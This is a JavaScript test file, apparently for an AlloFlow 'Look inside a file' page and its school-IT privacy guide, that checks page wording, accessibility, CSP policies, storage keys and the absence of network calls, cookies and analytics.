      // The name of the policy line and the policy's own keywords are quoted as they are written in a file.
      const text = read(file).replace(/Content-Security-Policy/gi, '').replace(/content-security-policy/g, '').replace(/unsafe-(?:inline|eval|hashes)/g, '');
      expect(PROMISES.exec(text), file).toBeNull();
    }
    expect(parse(GUIDE).body.textContent).toContain(FERPA);
    expect(read(GUIDE).split('FERPA').length - 1).toBe(1);
    expect(parse(GUIDE).querySelector('p.decision').textContent).toBe(FERPA);
    for (const file of [PAGE, GUIDE]) expect(parse(file).body.textContent, file).not.toContain('!');
    // American spelling. The manifest of a file names its license "licence": the checks read that name and show "License".
    for (const file of WRITTEN) expect(BRITISH.exec(read(file).replace(/\bm\.licence\b/g, '')), file).toBeNull();
    expect(read(CORE).match(/licence/g).length).toBe(read(CORE).match(/\bm\.licence\b/g).length);
  });

  it('keep the product name in one place, and the look of the other pages', () => {
    for (const file of [PAGE, GUIDE]) {
      expect(read(file).split(NAME).length - 1, file).toBe(1);
      const doc = parse(file);
      expect(doc.getElementById('product-name').textContent).toBe(NAME);
      expect([...doc.querySelectorAll('link[rel="icon"]')].map((node) => node.getAttribute('href'))).toEqual(['packets-mark.svg']);
      expect(doc.querySelector('a.skip').getAttribute('href')).toBe('#main');
      expect(doc.querySelector('header') && doc.querySelector('main#main') && doc.querySelector('footer')).toBeTruthy();
      expect([...doc.querySelectorAll('footer a')].map((node) => node.textContent)).toEqual(['More from AlloFlow']);
      expect(doc.querySelector('.brand').getAttribute('href')).toBe('packets.html');
    }
    // One name for the page everywhere (2026-11-12): "Look inside a file", never "Check a file" (a check is a kind of packet).
    expect([parse(PAGE).title, parse(GUIDE).title]).toEqual(['Look inside a file', 'For school IT: check a packet in ten minutes']);
    expect(parse(PAGE).querySelector('h1').textContent).toBe('Look inside a file');
    for (const file of readdirSync('.').filter((name) => /^packets[\w-]*\.(?:html|js)$/.test(name))) {
      expect(read(file), file).not.toContain('Check a file');
      for (const link of /\.html$/.test(file) ? parse(file).querySelectorAll('a[href="packets-verify.html"]') : []) expect(link.textContent, file).toBe('Look inside a file');
    }
    expect([parse(PAGE).querySelector('.top-link').getAttribute('href'), parse(GUIDE).querySelector('.top-link').getAttribute('href')]).toEqual([GUIDE, PAGE]);
    for (const file of [CORE, SCRIPT, STYLES]) expect(read(file), file).not.toContain(NAME);
    // Only what packets.css lacks: the colors and the fonts are its own, used by name. Outside the print sheet no color is written out.
    const css = read(STYLES);
    expect(css).not.toMatch(/:root|--[\w-]+\s*:/);
    expect(css.match(/font-family:[^;]+;/g).every((rule) => rule === 'font-family: var(--mono);')).toBe(true);
    const screen = css.slice(0, css.indexOf('@media print'));
    expect(screen.match(/#[0-9a-f]{3,8}\b/gi)).toBeNull();
    for (const name of new Set(css.match(/var\(--[\w-]+\)/g))) expect(read('packets.css'), name).toContain(name.slice(4, -1) + ':');
    for (const name of ['wrap', 'top', 'brand', 'proof', 'btn', 'btn-primary', 'btn-small', 'btn-text', 'hint', 'note', 'sr-only', 'skip', 'foot', 'kicker', 'plain-list', 'steps-list', 'actions', 'rule-text']) {
      expect(read('packets.css'), name).toMatch(new RegExp('\\.' + name + '[ ,.:{>\\[]'));
      expect(read(PAGE) + read(GUIDE) + read(SCRIPT), name).toMatch(new RegExp('[\'" ]' + name + '[\'" ]'));
    }
    // No class this stylesheet gives rules to is one packets.css already styles, but for the ones borrowed on purpose.
    // ("verify" and "result" are both in packets.css: a main named .verify once took its box and its small headings.)
    const classesOf = (text) => new Set(text.replace(/\/\*[\s\S]*?\*\//g, '').match(/\.[a-z][\w-]*/g).map((name) => name.slice(1)));
    const mine = classesOf(css), shared = classesOf(read('packets.css'));
    expect([...mine].filter((name) => shared.has(name)).sort()).toEqual(['actions', 'brand', 'btn', 'foot', 'hint', 'kicker', 'plain-list', 'proof', 'rule-text', 'skip', 'steps-list', 'top', 'top-link', 'top-row', 'wrap']);
    for (const node of [...parse(PAGE).querySelectorAll('main, main *'), ...parse(GUIDE).querySelectorAll('main, main *')]) {
      for (const name of node.classList) if (shared.has(name)) expect(['wrap', 'btn', 'btn-primary', 'btn-text', 'btn-small', 'note', 'note-problem', 'sr-only', 'steps-list', 'plain-list', 'hint'], name).toContain(name);
    }
    // The same for the classes the page script gives to what it draws.
    const script = read(SCRIPT);
    const drawn = [...script.matchAll(/\bel\('[a-z0-9]+', '([^']+)'/g), ...script.matchAll(/\bbutton\('([^']+)'/g), ...script.matchAll(/className(?: \+)?[:=] '([^']+)'/g)].flatMap((m) => m[1].trim().split(/\s+/));
    expect(drawn.length).toBeGreaterThan(30);
    expect([...new Set(drawn.filter((name) => shared.has(name)))].sort()).toEqual(['actions', 'btn', 'hint', 'kicker', 'plain-list', 'rule-text']);
    expect([...new Set(drawn.filter((name) => !shared.has(name) && !css.includes('.' + name)))]).toEqual([]);
    expect(css).toMatch(/@media print \{/);
    expect(css).toMatch(/prefers-reduced-motion/);
    expect(css).toMatch(/forced-colors: active/);
    expect(css).not.toMatch(/animation|@keyframes/);
  });

  it('have one h1, ordered headings, named controls and a live region', () => {
    for (const file of [PAGE, GUIDE]) {
      const doc = parse(file);
      const levels = [...doc.querySelectorAll('h1, h2, h3, h4, h5, h6')].map((node) => Number(node.tagName[1]));
      expect(levels.filter((level) => level === 1), file).toEqual([1]);
      levels.forEach((level, i) => { if (i) expect(level - levels[i - 1], file).toBeLessThanOrEqual(1); });
      for (const node of doc.querySelectorAll('input, select, textarea')) expect((node.getAttribute('aria-label') || '').trim().length, node.outerHTML.slice(0, 80)).toBeGreaterThan(0);
      for (const node of doc.querySelectorAll('button, a[href]')) expect((node.textContent.trim() || node.getAttribute('aria-label') || '').length, node.outerHTML.slice(0, 80)).toBeGreaterThan(0);
      for (const node of doc.querySelectorAll('button')) expect(node.getAttribute('type')).toBe('button');
      for (const node of doc.querySelectorAll('[aria-describedby], [aria-labelledby]')) {
        for (const id of (node.getAttribute('aria-describedby') || node.getAttribute('aria-labelledby')).split(/\s+/)) expect(doc.getElementById(id), '#' + id).toBeTruthy();
      }
      expect(new Set([...doc.querySelectorAll('[id]')].map((node) => node.id)).size).toBe(doc.querySelectorAll('[id]').length);
      expect(doc.documentElement.getAttribute('lang')).toBe('en');
      expect(doc.querySelectorAll('main').length).toBe(1);
      expect(doc.querySelector('meta[name="viewport"]').getAttribute('content')).not.toMatch(/user-scalable|maximum-scale/);
    }
    const doc = parse(PAGE);
    const said = doc.getElementById('said');
    expect([said.getAttribute('role'), said.getAttribute('aria-live'), said.className]).toEqual(['status', 'polite', 'sr-only']);
    // On first sight: one place to put a file, one main button, the samples, and the limits. No report yet.
    expect(doc.getElementById('reports').hidden).toBe(true);
    expect([...doc.querySelectorAll('#pick button')].map((node) => node.textContent)).toEqual(['Choose a file', 'a practice file', 'a check', 'a file that was changed']);
    expect(doc.querySelector('.drop-foot-label').textContent).toBe('Try with a sample file:');
    expect(doc.getElementById('files').hasAttribute('multiple')).toBe(true);
  });
});

describe('the guide for school IT', () => {
  const doc = parse(GUIDE);
  const text = (selector) => [...doc.querySelectorAll(selector)].map((node) => node.textContent.replace(/\s+/g, ' ').trim());

  it('says what a packet is in three sentences, and where the data goes in six steps', () => {
    expect(doc.querySelector('h1').textContent).toBe('For school IT: check a packet in ten minutes');
    const lead = doc.querySelector('.guide-lead').textContent;
    expect(lead.split(/(?<=\.)\s+/).length).toBe(3);
    expect(lead).toMatch(/^A packet is one HTML file /);
    expect(text('h2')).toEqual(['Where the data goes', 'Check it yourself', 'The facts, for a privacy review', 'Known limits']);
    const flow = text('section[aria-labelledby="flow-title"] li');
    expect(flow.length).toBe(6);
    expect(flow[2]).toBe("The student opens the file in a browser. The student's place, answers and the time on each item are kept in that browser's local storage, on that device.");
    expect(flow[3]).toBe('At the end the student presses one button to save a results file to the device: CSV, for a spreadsheet. JSON and a copy to paste are under Other ways to save. Saving sends nothing.');
    // A teacher's page says "student"; "learner" stays only where a technical name is quoted (#learner=, the CSV column).
    expect(doc.body.textContent.replace(/#learner=\w*/g, '')).not.toMatch(/\blearners?\b/i);
    expect(doc.querySelector('section[aria-labelledby="flow-title"] a').getAttribute('href')).toBe('packets-results.html');
  });

  it('gives steps a technician can do with the file and a browser, each matching what a real file holds', () => {
    const steps = text('section[aria-labelledby="steps-title"] li');
    expect(steps.map((step) => step.split('.')[0])).toEqual(['Read the report', 'Find the policy line', 'Read the policy', 'Check the script hash', 'Search for what a policy cannot stop', 'Run it and watch', 'Find the saved place']);
    // Every piece of a policy the guide quotes is in the policy of a real file.
    const policy = cspOf(F.practice);
    for (const piece of ["default-src 'none'", "connect-src 'none'", 'img-src data:', 'media-src data: blob:', "form-action 'none'", "base-uri 'none'"]) {
      expect(steps[2], piece).toContain(piece);
      expect(policy.split('; '), piece).toContain(piece);
    }
    expect(policy).toMatch(/script-src 'sha256-[A-Za-z0-9+/=]+'/);
    expect(F.practice).toContain('<meta http-equiv="Content-Security-Policy" content="');
    // What the guide says a search finds is what a search finds: one use of location, http only in http-equiv, no open( and no <form.
    expect(steps[4]).toContain("the code uses location once, to read the student's code name after # in the file's own address, and http appears only in http-equiv");
    // "One script that runs, plus one data block": a real file has exactly those two scripts.
    expect(steps[3]).toContain('The file has one script that runs, plus one data block.');
    for (const file of [F.practice, F.check]) expect([...new JSDOM(file).window.document.querySelectorAll('script')].map((node) => node.type || 'code').sort()).toEqual(['application/json', 'code']);
    for (const file of [F.practice, F.check, F.coded]) {
      expect(file.split('location').length - 1).toBe(1);
      expect(file).toContain("String(win.location.hash || '')");
      expect(file.split('http').length - 1).toBe(file.split('http-equiv').length - 1);
      expect(file).not.toMatch(/\bopen\(|<form/);
    }
    expect(F.mailbox.split('http').length - 1).toBeGreaterThan(1);
    // The name of the saved place, as the guide spells it, is the name a file uses.
    expect(steps[6]).toContain('There is one key, named alloflow-take-home: then the packet id, a colon and the version.');
    const m = manifestOf(F.practice);
    expect(m.stores[0].key).toBe('alloflow-take-home:' + m.packet.id + ':' + m.packet.version);
    expect(m.stores[0].until).toBe('Start over or Practice again');
    expect(manifestOf(F.check).stores[0].until).toBe('the browser storage is cleared; Start over keeps only the learner label and the count of tries');
    expect(steps[6]).toContain("A check keeps the student's label and a count of tries after Start over, so clear a check in the browser.");
    expect(doc.querySelector('section[aria-labelledby="steps-title"] a').getAttribute('href')).toBe(PAGE);
  });

  it('gives a privacy officer the facts in one table, and leaves the decision to the district', () => {
    const rows = [...doc.querySelectorAll('.facts-table tr')].map((row) => [row.querySelector('th').textContent, row.querySelector('td').textContent.replace(/\s+/g, ' ').trim()]);
    expect(rows.map((row) => row[0])).toEqual(['What is collected', 'Where it is stored', 'Who can read it', 'What leaves the device, and when', 'The class mailbox kind', "What this site's server can see",
      'Accounts, cookies, analytics', 'How long it is kept', 'License and code']);
    for (const cell of doc.querySelectorAll('.facts-table th')) expect(cell.getAttribute('scope')).toBe('row');
    const fact = Object.fromEntries(rows);
    // The label a student types is asked for in these words, and may be left out.
    expect(fact['What is collected']).toContain('A label the student types (a code name or a first name; it can be left blank)');
    expect([loader.DEFAULT_LABELS.learner_label, loader.DEFAULT_LABELS.name_prompt_skip]).toEqual(['Your code name or first name', 'Continue without a name']);
    // Everything a results file records is named (2026-11-12), and each is a column or a trailer cell the file really writes.
    expect(fact['What is collected']).toBe('A label the student types (a code name or a first name; it can be left blank). For each item: each answer, the number of tries, the time on the item, '
      + 'how often each help was used (a count for each, such as hearing a word again, and the reading tools: bigger text, contrast, spacing, reading focus and the magnifier), '
      + 'and a note when an item was skipped, ran out of time or was open when the file was opened again. The start and finish times from the device clock, with its offset from UTC, '
      + 'and a random session number. A check also records the seconds the page was hidden, the try number, and whether the page was left for more than 3 seconds, reloaded, '
      + 'or had its clock set back. Nothing else: no email address, no account, no details of the device or the browser, no location.');
    const loaderText = read('word_sounds_take_home_loader.js');
    for (const column of ["'session_id'", "'learner'", "'started_local'", "'finished_local'", "'responses'", "'tries'", "'time_ms'", "'supports'", "'flag'"]) expect(loaderText, column).toContain(column);
    for (const piece of ["kv('hidden_s'", "kv('attempt'", 'c.flags.left_the_page = 1', 'c.flags.reloaded = 1', 'c.flags.clock_changed = 1', "rec.flag = 'skipped'", "rec.flag = 'time_up'", "rec.flag = 'resumed'", 'getTimezoneOffset()']) {
      expect(loaderText, piece).toContain(piece);
    }
    // "No details of the device or the browser": the script of a file reads none.
    for (const file of [F.practice, F.check]) expect(scriptOf(file)).not.toMatch(/userAgent|\.platform\b|geolocation|deviceMemory|hardwareConcurrency|navigator\.language|screen\.(?:width|height)/);
    // The mailbox kind is said plainly, with the three ways to recognize it.
    expect(fact['The class mailbox kind']).toContain('How to recognize one: the report on Look inside a file starts "This file can send results to one place", the policy\'s connect-src names script.google.com, and About this file says so.');
    expect(ONE_PLACE.startsWith('This file can send results to one place')).toBe(true);
    expect(loader.DEFAULT_LABELS.about_mailbox).toContain("your results go to your teacher's class mailbox at {host}");
    expect(cspOf(F.mailbox)).toMatch(/connect-src https:\/\/script\.google\.com /);
    // "Files made on this site's maker page have no mailbox. Checks are made with no mailbox."
    expect(read('word_sounds_packet_builder.js')).not.toMatch(/submit/);
    expect(read('packet_check_builder.js').match(/submit[^,;]*/g)).toEqual(['submit: null }']);
    expect([lessonOf(F.practice).submit ?? null, lessonOf(F.check).submit ?? null]).toEqual([null, null]);
    expect(fact['License and code']).toContain('AGPL-3.0');
    for (const file of ['word_sounds_packet_builder.js', 'packet_math_practice_builder.js', 'packet_check_builder.js', 'word_sounds_take_home_loader.js', CORE]) {
      expect(fact['License and code']).toContain(file);
      expect(existsSync(file)).toBe(true);
    }
    expect(doc.querySelector('.facts-table + .decision').textContent).toBe(FERPA);
  });

  it('what it says of the other pages is true of them', () => {
    const fact = Object.fromEntries([...doc.querySelectorAll('.facts-table tr')].map((row) => [row.querySelector('th').textContent, row.querySelector('td').textContent]));
    expect(fact['Accounts, cookies, analytics']).toContain('None on these pages: no sign-in, no cookies, no analytics or tracking scripts.');
    // Every Packets page there is, also one added after this test was written.
    const pages = readdirSync('.').filter((name) => /^packets[\w-]*\.html$/.test(name));
    expect(pages).toEqual(expect.arrayContaining(['packets.html', 'packets-make.html', 'packets-results.html', 'packets-try.html', PAGE, GUIDE]));
    for (const page of pages) {
      const other = parse(page);
      for (const script of other.querySelectorAll('script')) {
        const src = script.getAttribute('src');
        expect(src, page).toMatch(/^[\w./-]+\.js$/);
        if (!existsSync(src)) continue;
        // No script any of these pages loads sets a cookie or loads an analytics or tracking library.
        expect(read(src), src).not.toMatch(/document\.cookie\s*=|google-analytics|googletagmanager|gtag\(|plausible\.io|segment\.com|hotjar|mixpanel|sentry\.io/i);
      }
      // Nothing to sign in with: no form to send, and no box for an email address.
      expect(other.querySelector('form, input[type="email"]'), page).toBeNull();
    }
    // The maker asks this site for the same sound files whatever is chosen, except the small files of the word store, which it asks
    // for by need: the server can see which of those were asked for, never a word. The results page can connect to nothing.
    expect(fact["What this site's server can see"]).toBe('When someone uses these pages: ordinary web requests for the pages, their scripts and, on the maker page, the sound files, '
      + 'with what every web request carries, such as the IP address and the time. Most sound files are the same whatever is chosen. '
      + 'Some words have their sounds in small files of about 40 words each, and the maker page asks only for the ones it needs: the server can see which of those files were asked for, not which words. '
      + 'Never the words or the choices, and never results. If a school puts a packet on its own web server, that server sees requests for the file and nothing the student does in it.');
    expect(require('../dev-tools/repack_word_sounds_word_audio.cjs').DEFAULT_MAX).toBe(40);
    expect(text('section[aria-labelledby="flow-title"] li')[0]).toContain('The maker page puts the file together in the browser. The words and the choices are not uploaded.');
    // Every address the maker asks for is in a fixed list in its own script, or is the word store's index, or is a file name that
    // index gives (a plain name, in the store's folder). None is put together from a word or a choice, and every request is a GET.
    const maker = read('packets-make.js');
    expect(maker).toMatch(/var SOUND_FILES = \[/);
    expect(maker).toContain("var WORD_STORE_INDEX = 'word_audio_shards/index.json';");
    expect(maker).toContain("if (!shard || typeof shard.file !== 'string' || !WORD_FILE_NAME.test(shard.file)) return;");
    expect([...new Set(maker.match(/window\.fetch\([\w.]+/g))].sort()).toEqual(['window.fetch(file.url', 'window.fetch(shard.url']);
    expect(maker).not.toMatch(/method\s*:|body\s*:|FormData|encodeURIComponent/);
    expect(parse('packets-results.html').querySelector('meta[http-equiv="Content-Security-Policy"]').getAttribute('content')).toContain("connect-src 'none'");
    expect(fact['Accounts, cookies, analytics']).toContain("the maker page keeps the teacher's last choices and the sound files, the results page keeps results only if a switch is turned on, and this page and Look inside a file keep nothing");
    // A teacher's own words (sounds, recording, picture): kept in the browser for this site, never uploaded; the microphone only on Record;
    // and the one page that can reach other sites, with its three services named. Each is true of the code.
    const squash = (value) => value.replace(/\s+/g, ' ').trim();
    expect(squash(fact['Accounts, cookies, analytics'])).toContain("What a teacher adds to a word on the maker page or on Find a picture (its sounds, a recording, a picture with its credit) is kept in that browser's storage for this site (IndexedDB) until the teacher removes it. It is not uploaded.");
    expect(read('packets_my_words.js')).toMatch(/IndexedDB database 'alloflow-packets-my-words'/);
    expect(text('section[aria-labelledby="flow-title"] li')[0]).toContain("What a teacher adds to a word there (its sounds, a recording, a picture) is kept in that browser's storage for this site and goes only into the files the teacher makes. The microphone is used only when the teacher presses Record.");
    expect(squash(fact['What leaves the device, and when'])).toBe('Nothing, unless a person passes on a saved results file. There is one exception: the class mailbox kind of practice file, in the next row. '
      + 'For teachers, one page of this site, Find a picture (packets-pictures.html), can search three picture services after the teacher turns its search on: Global Symbols, Openverse and Wikimedia Commons. '
      + 'It sends them the word searched for and asks them for the pictures it shows. Every other page of this site reaches only this site.');
    const reaches = (page) => (parse(page).querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content') || '').match(/https?:\/\/[^\s;]+/g) || [];
    for (const page of pages.filter((name) => name !== 'packets-pictures.html')) expect(reaches(page), page).toEqual([]);
    expect([...new Set(reaches('packets-pictures.html').map((url) => url.replace(/^https:\/\//, '')))].sort()).toEqual(['api.openverse.org', 'commons.wikimedia.org', 'globalsymbols.com', 'thumb.wikimedia.org', 'upload.wikimedia.org']);
    // The maker asks for the microphone in one script only, and only from the Record button.
    expect(read('packets-make.js')).not.toMatch(/getUserMedia/);
    expect(read('packets-words.js')).toMatch(/function record\(\) \{[\s\S]*?media\.getUserMedia\(/);
    expect(read('packets-make.js')).toMatch(/var STORE_KEY = 'alloflow-packets-maker\/1';\s+var SOUND_CACHE = /);
    expect(read('packets-results.html')).toContain('Nothing is kept on this device unless you turn on');
  });

  it('lists its limits, and marks what was reported and not tested', () => {
    const limits = text('section[aria-labelledby="limits-title"] li');
    expect(limits.length).toBe(6);
    expect(limits[0]).toBe('A results file can be edited. The check value inside it finds accidental changes, not deliberate ones.');
    expect(manifestOf(F.practice).integrity).toContain('It detects accidental edits, not deliberate ones.');
    expect(limits[1]).toBe("Times come from the clock of the student's device.");
    expect(limits[2]).toBe('A packet is for practice and for checking progress. It is not a locked check: the answers travel inside the file so that it can score with no internet.');
    // The previews: the same three, said the same way as the front door, and marked as reported.
    expect(limits[4]).toBe('The previews in Google Drive, Google Classroom and the iPad Files app do not run the file: the file shows a note that asks the student to download it and open it in a browser. '
      + "An iPad may need the file served from a web address, such as the school's learning platform. Reported, not yet tested by us.");
    const front = [...parse('packets.html').querySelectorAll('#check li')].map((li) => li.textContent).find((line) => line.startsWith('Run inside a file preview.'));
    expect(front).toContain('The previews in Google Drive, Google Classroom and the iPad Files app do not run the file.');
    expect(front.endsWith('Reported, not yet tested by us.')).toBe(true);
    expect(doc.querySelector('.tested').textContent).toBe('Reported, not yet tested by us.');
    expect(limits[5]).toBe('The file has had no formal accessibility audit yet.');
    expect(limits[3]).toContain('it cannot prove that software is free of mistakes');
    // "It is one script and it is not minified": a real file's script is thousands of short lines.
    const lines = scriptOf(F.practice).split('\n').filter((line) => !line.startsWith('var lesson=') && !line.startsWith('var labels='));
    expect(lines.length).toBeGreaterThan(400);
    expect(Math.max(...lines.map((line) => line.length))).toBeLessThan(1500);
    expect(read(STYLES)).toMatch(/@media print \{[\s\S]*\.guide \{ font-size: \d\.\dpt;/);
  });
});

// ---------------------------------------------------------------------------
// Part 5: the page, run in jsdom
// ---------------------------------------------------------------------------
const WATCHED = 'script, img, iframe, frame, object, embed, link, style, meta, base, form, a, audio, video, source, svg, input';
function openPage(options = {}) {
  const dom = new JSDOM(read(PAGE), { runScripts: 'outside-only', pretendToBeVisual: true, url: 'https://packets.test/site/packets-verify.html' });
  const w = dom.window, d = w.document;
  const page = { dom, w, d, printed: [], reached: [], copied: [], readers: 0 };
  w.TextEncoder = TextEncoder;
  w.TextDecoder = TextDecoder;
  // Anything that could reach a network is a trap here: the page must never touch one.
  for (const name of ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource']) w[name] = function () { page.reached.push(name); throw new Error(name + ' was called'); };
  w.navigator.sendBeacon = () => { page.reached.push('sendBeacon'); return false; };
  w.HTMLElement.prototype.scrollIntoView = function () {};
  w.print = () => { page.printed.push([...d.querySelectorAll('#report-list details')].map((box) => box.open)); };
  if (options.clipboard !== false) Object.defineProperty(w.navigator, 'clipboard', { configurable: true, value: { writeText: (text) => { page.copied.push(text); return Promise.resolve(); } } });
  const RealReader = w.FileReader;
  w.FileReader = function () { page.readers++; return new RealReader(); };
  // The page's own scripts, in the order the page names them: what the page does not load, the test does not have.
  for (const script of d.querySelectorAll('script[src]')) w.eval(read(script.getAttribute('src')));
  page.$ = (id) => d.getElementById(id);
  page.until = async (test, what) => {
    for (let i = 0; i < 1500; i++) { if (test()) return; await new Promise((resolve) => setTimeout(resolve, 10)); }
    throw new Error('Timed out waiting for ' + what);
  };
  page.file = (text, name) => new w.File([text], name, { type: 'text/html' });
  page.drop = async (files) => {
    const before = d.querySelectorAll('.report').length;
    const event = new w.Event('drop', { bubbles: true, cancelable: true });
    event.dataTransfer = { types: ['Files'], files };
    page.$('main').dispatchEvent(event);
    expect(event.defaultPrevented).toBe(true);
    await page.until(() => d.querySelectorAll('.report').length >= before + Math.min(files.length, 10) && /\bread\./.test(page.$('said').textContent), 'the files to be read');
    return page.$('said').textContent;
  };
  page.reports = () => [...d.querySelectorAll('.report')];
  page.parts = (report) => [...report.querySelectorAll('details')];
  page.part = (report, title) => page.parts(report).find((box) => box.querySelector('.part-title').textContent === title);
  page.items = (report, title) => [...page.part(report, title).querySelectorAll('.part-body li')].map((node) => node.textContent);
  page.rows = (table) => [...table.querySelectorAll('tbody tr')].map((row) => [...row.children].map((cell) => cell.textContent));
  page.stored = () => ({ local: w.localStorage.length, session: w.sessionStorage.length, cookie: d.cookie });
  page.watched = () => d.querySelectorAll(WATCHED).length;
  return page;
}

describe('the page: from a dropped file to its report', () => {
  it('starts with a place to put a file and no report, and has touched nothing', () => {
    const page = openPage();
    expect(page.$('reports').hidden).toBe(true);
    expect(page.$('report-list').children.length).toBe(0);
    expect(page.d.title).toBe(NAME + ': Look inside a file');
    expect(page.d.querySelector('[data-show-rule]').textContent).toBe(CSP);
    expect(page.stored()).toEqual({ local: 0, session: 0, cookie: '' });
    expect(page.reached).toEqual([]);
    expect(Object.keys(page.w.AlloPacketSamples)).toEqual(['practice', 'check', 'changed']);
  });

  it('a dropped practice file: the headline, then five closed parts a principal can read, then one for IT staff', async () => {
    const page = openPage();
    const said = await page.drop([page.file(F.practice, 'short-vowels.html')]);
    expect(said).toBe('1 file read. ' + CLOSED);
    expect(page.$('reports').hidden).toBe(false);
    const [report] = page.reports();
    expect(report.getAttribute('data-result')).toBe('closed');
    const line = report.querySelector('.verdict-line');
    expect([line.tagName, line.textContent, line.id, page.d.activeElement]).toEqual(['H3', CLOSED, 'verdict-0', line]);
    expect(report.getAttribute('aria-labelledby')).toBe('verdict-0');
    expect(report.querySelector('.kicker').textContent).toBe('File: short-vowels.html');
    expect(report.querySelector('.verdict-sub').textContent).toBe('This file declares itself an AlloFlow practice file (file type alloflow-packet/1).');
    const r = verify.verifyPacket(F.practice);
    expect([...report.querySelectorAll('.facts-row > div')].map((row) => [row.querySelector('dt').textContent, row.querySelector('dd').textContent]))
      .toEqual([['Kind', 'Practice file'], ['Size', r.sizeText], ['Recorded sounds', String(r.counts.sounds)], ['Pictures', '0']]);
    expect(report.querySelector('.fingerprint code').textContent).toBe(createHash('sha256').update(F.practice, 'utf8').digest('hex'));
    // The parts, in order, all closed.
    expect(page.parts(report).map((box) => box.querySelector('.part-title').textContent)).toEqual(PARTS);
    expect(page.parts(report).map((box) => box.open)).toEqual([false, false, false, false, false, false]);
    expect(page.items(report, PARTS[0])).toEqual(r.plain.about);
    expect(page.items(report, PARTS[1])).toEqual(r.plain.reach);
    expect(page.items(report, PARTS[2])).toEqual(r.plain.keeps);
    expect(page.items(report, PARTS[3])).toEqual(r.plain.saves);
    expect(page.items(report, PARTS[4])).toEqual(['Nothing was found that a person needs to look at.']);
    expect(page.part(report, PARTS[4]).querySelector('.part-count').textContent).toBe('0');
    expect(page.items(report, PARTS[1])[0]).toBe('It cannot connect to anything. Its policy line tells the browser to refuse every connection, and the browser enforces it.');
    expect(page.$('reports-line').textContent).toBe('1 file on this page. Nothing here is kept: closing the tab clears it.');
    // The page's headings stay in order with a report on it.
    const levels = [...page.d.querySelectorAll('h1, h2, h3, h4')].map((node) => Number(node.tagName[1]));
    levels.forEach((level, i) => { if (i) expect(level - levels[i - 1]).toBeLessThanOrEqual(1); });
    expect(page.stored()).toEqual({ local: 0, session: 0, cookie: '' });
    expect(page.reached).toEqual([]);
  });

  it('for IT staff: the policy word for word, the three hashes, each statement beside the code, and every place the scan found', async () => {
    const page = openPage();
    await page.drop([page.file(F.coded, 'check.html')]);
    const [report] = page.reports();
    const it = page.part(report, 'For IT staff');
    const r = verify.verifyPacket(F.coded);
    expect([...it.querySelectorAll('h4')].map((node) => node.textContent)).toEqual(['The policy line', 'The script and its hashes', 'What the file says, beside what its code shows', 'Everything the scan found']);
    expect(it.querySelector('code.rule-text').textContent).toBe(cspOf(F.coded));
    const hex = sha(scriptOf(F.coded));
    expect([...it.querySelectorAll('.hashes > div')].map((row) => [row.querySelector('dt').textContent, row.querySelector('dd').textContent])).toEqual([
      ['Worked out from the file', hex], ['In the policy', hex], ['In the manifest', hex], ['Do the three agree?', 'agree. The script, the hash in the policy and the hash in the manifest are the same.'],
      ['The code without its data block', r.script.codeSha256], ['The whole file', createHash('sha256').update(F.coded, 'utf8').digest('hex')]]);
    const [policy, claims, found] = [...it.querySelectorAll('table')];
    expect([...policy.querySelectorAll('thead th')].map((cell) => cell.textContent)).toEqual(['Question', 'Answer', 'The part of the policy that says so']);
    expect(page.rows(policy)).toEqual(r.policy.facts.map((row) => [row.question, row.answer, row.basis]));
    expect(page.rows(claims)).toEqual(r.claims.map((row) => [row.label, row.says, row.shows, row.verdict]));
    expect(page.rows(claims).find((row) => row[0] === 'a teacher code')[3]).toBe('agree');
    expect(page.rows(found).map((row) => row[0])).toEqual(r.findings.map((f) => f.line + ' (character ' + f.col + ')'));
    expect(page.rows(found).every((row) => row[2] === EXPECTED && row[4].length > 10)).toBe(true);
    // Every cell carries the name of its column, for the narrow layout where the head row is not shown.
    for (const cell of found.querySelectorAll('tbody td')) expect(['Line', 'Found', 'Kind', 'Why', 'In the file']).toContain(cell.getAttribute('data-label'));
    expect(it.textContent).toContain(verify.HASH_LIMIT);
    expect(it.textContent).toContain(LIMITS);
    expect([...it.querySelectorAll('.actions button')].map((node) => node.textContent)).toEqual(['Copy this report', 'Print']);
    expect(it.textContent).not.toContain('tulip-47');
  });

  it('copies the report as plain text, and falls back to a box of text where the browser will not copy', async () => {
    const page = openPage();
    await page.drop([page.file(F.practice, 'short-vowels.html')]);
    const [report] = page.reports();
    report.querySelector('[data-copy]').click();
    await page.until(() => /^Copied/.test(report.querySelector('.copy-said').textContent), 'the copy');
    expect(page.copied.length).toBe(1);
    const text = page.copied[0];
    const lines = text.split('\n');
    expect(lines[0]).toBe(NAME + ': check of a file');
    expect(lines[1]).toBe('File: short-vowels.html');
    expect(lines[2]).toBe('Size: ' + verify.sizeText(Buffer.byteLength(F.practice)) + ' (' + Buffer.byteLength(F.practice) + ' bytes)');
    expect(lines[3]).toMatch(/^Checked: \d{4}-\d{2}-\d{2} \d{2}:\d{2}$/);
    expect(lines[4]).toBe('File fingerprint (SHA-256 of the file as it is on disk): ' + createHash('sha256').update(F.practice, 'utf8').digest('hex'));
    expect(text).toContain('\nResult: ' + CLOSED + '\n');
    for (const title of PARTS) expect(text).toContain('\n' + title.toUpperCase() + '\n');
    expect(text).toContain('\nPolicy line: ' + cspOf(F.practice) + '\n');
    expect(text).toContain('\nThe three: agree. ');
    expect(text).toContain('- Nothing was found that a person needs to look at.');
    expect(text.endsWith(LIMITS)).toBe(true);
    expect(report.querySelector('.copy-said').getAttribute('role')).toBe('status');
    expect(report.querySelector('.copy-box').hidden).toBe(true);
    // No clipboard: the same text, in a box to select.
    const bare = openPage({ clipboard: false });
    await bare.drop([bare.file(F.practice, 'short-vowels.html')]);
    const [second] = bare.reports();
    second.querySelector('[data-copy]').click();
    const area = second.querySelector('textarea.copy-text');
    expect(area.value.replace(/Checked: [^\n]+/, '')).toBe(text.replace(/Checked: [^\n]+/, ''));
    expect([area.readOnly, area.getAttribute('aria-label'), second.querySelector('.copy-box').hidden]).toEqual([true, 'The report as text', false]);
    expect(second.querySelector('.copy-said').textContent).toBe('This browser did not let the page copy. Select all of the text below and copy it.');
    expect(bare.stored()).toEqual({ local: 0, session: 0, cookie: '' });
  });

  it('prints with every part open, and closes them again afterward', async () => {
    const page = openPage();
    await page.drop([page.file(F.practice, 'short-vowels.html')]);
    const [report] = page.reports();
    page.part(report, PARTS[1]).open = true;
    report.querySelector('[data-print]').click();
    expect(page.printed).toEqual([[true, true, true, true, true, true]]);
